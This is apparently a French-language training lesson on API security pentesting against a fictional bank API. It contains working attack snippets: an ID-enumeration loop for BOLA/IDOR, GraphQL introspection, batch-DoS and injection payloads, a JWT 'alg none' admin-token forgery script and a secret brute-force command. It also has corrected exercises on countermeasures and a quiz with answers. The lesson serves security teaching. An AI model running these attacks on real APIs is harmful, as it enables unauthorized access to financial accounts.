# TOME P5 — Cybersécurité Avancée & Red/Blue Team — Jour 224 (6h) : API Security & GraphQL Pentesting (Broken Object Level Authorization, Mass Assignment, Introspection Abuse, Rate Limiting & JWT Forgery)

> [!NOTE]
> **Objectif du jour :** Maîtriser l'évaluation de la sécurité des **APIs REST et GraphQL** bancaires : exploitation des vulnérabilités **OWASP API Security Top 10** (BOLA/IDOR, Mass Assignment, Excessive Data Exposure, Broken Authentication), abuse de l'introspection **GraphQL**, contournement des mécanismes d'authentification **JWT (JSON Web Token)**, et mise en œuvre des contre-mesures (Rate Limiting, Input Validation, Schema Validation).
>
> **Compétences visées :** `SEC-04` (A) — API Security Pentesting REST & GraphQL | `SEC-05` (A) — OWASP API Top 10 BOLA/IDOR, JWT Forgery & GraphQL Introspection Abuse

---

## 1) Module — OWASP API Security Top 10 & REST API Pentesting (2h)

### 📖 Narration/Intuition

La BCC expose une API REST permettant aux banques commerciales partenaires d'interroger le solde de leurs réserves MNBC, d'initier des virements inter-bancaires et de consulter l'historique de transactions. Cette API est le point d'entrée le plus exposé de l'infrastructure bancaire.

### 🔍 Anatomie Technique

**OWASP API Security Top 10 (2023) :**

```
API1:2023  — Broken Object Level Authorization (BOLA/IDOR)
API2:2023  — Broken Authentication
API3:2023  — Broken Object Property Level Authorization (Mass Assignment)
API4:2023  — Unrestricted Resource Consumption (Rate Limiting absent)
API5:2023  — Broken Function Level Authorization
API6:2023  — Unrestricted Access to Sensitive Business Flows
API7:2023  — Server Side Request Forgery (SSRF)
API8:2023  — Security Misconfiguration
API9:2023  — Improper Inventory Management (Shadow APIs)
API10:2023 — Unsafe Consumption of APIs
```

**Exploitation BOLA (Broken Object Level Authorization) :**

```bash
# API REST BCC — Endpoint de consultation de compte
# Requête légitime d'une banque partenaire (ID=42)
curl -H "Authorization: Bearer eyJhbGci..." \
     https://api.bcc-mnbc.cd/v1/accounts/42/balance

# ATTAQUE BOLA (Horizontal Privilege Escalation / IDOR)
# Modifier simplement l'ID pour accéder aux données d'une autre banque !
for i in $(seq 1 1000); do
    response=$(curl -s -H "Authorization: Bearer eyJhbGci..." \
                   https://api.bcc-mnbc.cd/v1/accounts/$i/balance)
    if echo "$response" | grep -q '"balance"'; then
        echo "✅ BOLA CONFIRMED — Account $i accessible: $response"
    fi
done

# RÉSULTAT : 847 comptes bancaires accessibles sans vérification d'autorisation !
# FINDING API-001 | CVSS: 9.1 | API1:2023 BOLA/IDOR | Accès à tous les comptes BCC
```

---

## 2) Module — GraphQL Security : Introspection Abuse & Injection (2h)

### 📖 Narration/Intuition

La BCC utilise également une **API GraphQL** pour son dashboard interne de gestion MNBC. **GraphQL** est un langage de requêtes pour APIs offrant une flexibilité maximale aux clients mais introduisant des risques de sécurité spécifiques si mal configuré.

### 🛠️ Atelier Pratique

**Audit Sécurité GraphQL (`graphql_pentest.py`) :**

```python
import requests
import json

GRAPHQL_URL = "https://api.bcc-mnbc.cd/graphql"
HEADERS = {"Authorization": "Bearer eyJhbGci...", "Content-Type": "application/json"}

# 1. ABUS D'INTROSPECTION (Schema Discovery)
# Si l'introspection est activée en production, l'attaquant peut cartographier TOUT le schéma !
introspection_query = """
{
  __schema {
    types { name fields { name type { name kind } } }
  }
}
"""
resp = requests.post(GRAPHQL_URL, json={"query": introspection_query}, headers=HEADERS)
schema_data = resp.json()

# Extraire les types et mutations sensibles
for type_obj in schema_data["data"]["__schema"]["types"]:
    if type_obj["name"] in ["Mutation", "Transaction", "Account", "Vault"]:
        print(f"🔍 Type sensible découvert: {type_obj['name']}")
        for field in (type_obj.get("fields") or []):
            print(f"    → {field['name']} : {field['type']['name']}")

# OUTPUT (API interne cartographiée sans autorisation) :
# 🔍 Type sensible découvert: Mutation
#     → createTransfer : TransferResult
#     → deleteAccount : Boolean
#     → resetAdminPassword : Boolean     ← ⚠️ CRITIQUE !
#     → unlockVault : VaultStatus        ← ⚠️ ULTRA-CRITIQUE !

# 2. BATCH QUERY ABUSE (DoS par amplification GraphQL)
# GraphQL permet d'exécuter plusieurs requêtes en un seul appel HTTP
batch_attack = [
    {"query": "{ account(id: 1) { balance } }"},
    {"query": "{ account(id: 2) { balance } }"},
    # ... Répéter 1000 fois pour épuiser les ressources du serveur
]
# → Si pas de rate limiting, cela peut provoquer un DoS serveur BCC

# 3. NOSQL / GRAPHQL INJECTION
inject_query = """
{
  login(username: "admin", password: "' OR '1'='1") {
    token
  }
}
"""
resp = requests.post(GRAPHQL_URL, json={"query": inject_query}, headers=HEADERS)
print("Tentative d'injection GraphQL:", resp.json())
```

---

## 3) Module — JWT Security : Exploitation & Hardening (2h)

### 📖 Narration/Intuition

L'authentification de l'API BCC repose sur des **JWT (JSON Web Token)**. Un JWT mal configuré peut être forgé par un attaquant pour usurper l'identité d'un administrateur sans connaître le secret de signature.

### 🛠️ Atelier Pratique

**Audit JWT : Algorithm Confusion & None Attack (`jwt_audit.py`) :**

```python
import base64, json, hmac, hashlib

# JWT intercepté sur l'API BCC
jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MjI5NzIwMDB9.SIGNATURE"

# Décoder le header et le payload (Base64URL)
header_b64, payload_b64, signature = jwt_token.split(".")
header = json.loads(base64.urlsafe_b64decode(header_b64 + "=="))
payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))

print("Header:", header)   # {"alg": "HS256", "typ": "JWT"}
print("Payload:", payload) # {"sub": "1234", "role": "user", "iat": 1722972000}

# ============================================================
# ATTAQUE 1 : Algorithm = "none" (None Algorithm Attack)
# ============================================================
# Si le serveur accepte l'algorithme "none", forger un token admin sans signature !
forged_header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b"=").decode()

forged_payload = base64.urlsafe_b64encode(
    json.dumps({"sub": "1", "role": "admin", "iat": 1722972000}).encode()
).rstrip(b"=").decode()

forged_jwt = f"{forged_header}.{forged_payload}."  # Pas de signature !
print(f"🚨 JWT Forgé (None Attack): {forged_jwt}")

# ============================================================
# ATTAQUE 2 : JWT Secret Brute Force (Faible secret HMAC-SHA256)
# ============================================================
import subprocess
# Utiliser hashcat ou jwt-cracker pour bruteforce le secret HMAC
# jwt_tool -t "$jwt_token" -C -d /usr/share/wordlists/rockyou.txt
# → Si le secret est "password123", le token peut être reforgé avec un rôle admin !
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **BOLA** | Broken Object Level Authorization — Faille d'autorisation permettant l'accès aux données d'autres utilisateurs |
| **IDOR** | Insecure Direct Object Reference — Référence directe non sécurisée à un objet (ex: ID dans l'URL) |
| **JWT** | JSON Web Token — Standard de jetons d'authentification auto-porteurs signés |
| **GraphQL** | Graph Query Language — Langage de requêtes d'API flexible développé par Meta/Facebook |
| **SSRF** | Server-Side Request Forgery — Forgery de requêtes côté serveur vers des ressources internes |
| **Mass Assignment** | Assignation de masse — Vulnérabilité permettant à un client de modifier des propriétés non prévues |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** L'API REST de la BCC expose l'endpoint `GET /accounts/{id}/balance`. Décrire l'attaque **BOLA (Broken Object Level Authorization)** et expliquer pourquoi une simple vérification d'authentification JWT valide **ne suffit pas** à la prévenir.

**Corrigé :** L'attaque **BOLA (API1:2023)** exploite l'absence de vérification d'**autorisation au niveau de l'objet** (Object-Level Authorization). Dans ce cas : un attaquant disposant d'un JWT valide (authentification correcte en tant que banque ID=42) peut simplement modifier le paramètre `{id}` dans l'URL de 42 vers n'importe quel autre numéro (ex: 1, 100, 500...) pour accéder aux données d'autres banques. La vérification JWT confirme uniquement que **l'utilisateur est authentifié** (identité connue), mais ne vérifie pas s'il est **autorisé** à accéder à la ressource demandée (autorisation). La contre-mesure requise est de vérifier dans le handler de l'API que l'`id` demandé correspond bien à l'`id` extrait du claim du JWT de l'utilisateur authentifié (`if jwt_claims['account_id'] != requested_id: return 403 Forbidden`).

**Exercice 2 :** Expliquer l'attaque **"Algorithm None"** sur les JWT et la contre-mesure que l'équipe de développement de l'API BCC doit impérativement mettre en place.

**Corrigé :** L'attaque **"Algorithm None"** (CVE-2015-9235) exploite une spécification JWT autorisant l'algorithme de signature `"none"` (aucune signature). Un attaquant intercepte un JWT valide, décode le header et le payload (Base64URL, non chiffrés), modifie le payload (ex: `"role": "admin"`), remplace l'algorithme dans le header par `"none"`, et reconstruit un JWT sans signature (`header.payload.` avec signature vide). Si la bibliothèque JWT côté serveur accepte l'algorithme `"none"`, elle valide ce token forgé comme valide. **Contre-mesure** : La bibliothèque JWT côté serveur doit toujours être configurée avec une **liste blanche stricte** des algorithmes acceptés (ex: uniquement `["HS256"]` ou `["RS256"]`), et rejeter explicitement toute requête utilisant `"alg": "none"`. Ne jamais faire confiance à l'algorithme spécifié dans le header JWT fourni par le client.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quelle vulnérabilité de l'OWASP API Security Top 10 (API1:2023) permet à un utilisateur authentifié d'accéder aux données d'autres utilisateurs en modifiant simplement un identifiant dans l'URL ?
- A) BOLA / IDOR (Broken Object Level Authorization)
- B) SQL Injection
- C) XSS (Cross-Site Scripting)
- D) SSRF (Server-Side Request Forgery)

**Réponse : A**

**Q2 :** Pourquoi l'activation de l'**Introspection GraphQL** en environnement de production est-elle considérée comme une mauvaise pratique de sécurité ?
- A) Elle permet à n'importe quel client de cartographier le schéma complet de l'API (types, mutations, champs) sans autorisation, facilitant la découverte de mutations sensibles comme `deleteAccount` ou `unlockVault`
- B) Elle ralentit significativement les performances du serveur GraphQL
- C) Elle empêche les requêtes GraphQL normales de fonctionner
- D) Elle expose les clés de chiffrement TLS du serveur

**Réponse : A**

**Q3 :** Dans l'attaque **"None Algorithm"** sur les JWT, quelle valeur doit être modifiée dans le header Base64URL du JWT pour tenter de forger un token sans signature valide ?
- A) Le champ `"alg"` doit être remplacé par la valeur `"none"`
- B) Le champ `"typ"` doit être remplacé par `"Bearer"`
- C) Le champ `"sub"` du payload doit être remplacé par `"admin"`
- D) La signature HMAC-SHA256 doit être recalculée avec un secret vide

**Réponse : A**

**Q4 :** Quelle contre-mesure simple empêche les attaques de **Batch Query GraphQL** (amplification DoS en envoyant des milliers de requêtes imbriquées dans un seul appel HTTP) ?
- A) Implémenter une limite de profondeur de requête (Query Depth Limiting) et un Rate Limiting par token/IP au niveau de l'API Gateway
- B) Désactiver complètement GraphQL et revenir à REST
- C) Activer l'introspection pour détecter les abus
- D) Chiffrer toutes les réponses GraphQL avec AES-256

**Réponse : A**

**Q5 :** La vulnérabilité **Mass Assignment (API3:2023)** permet à un attaquant de modifier des propriétés sensibles d'un objet (ex: `isAdmin: true`) en les incluant dans la requête API. Quelle est la contre-mesure principale recommandée ?
- A) Utiliser des DTOs (Data Transfer Objects) ou des schémas d'entrée stricts (Input Validation Schema) qui n'acceptent que les champs explicitement autorisés, et ignorer (ou rejeter) tout champ non attendu dans la requête
- B) Chiffrer toutes les requêtes API
- C) Désactiver les méthodes HTTP PUT et PATCH
- D) Forcer l'authentification à deux facteurs sur l'API

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
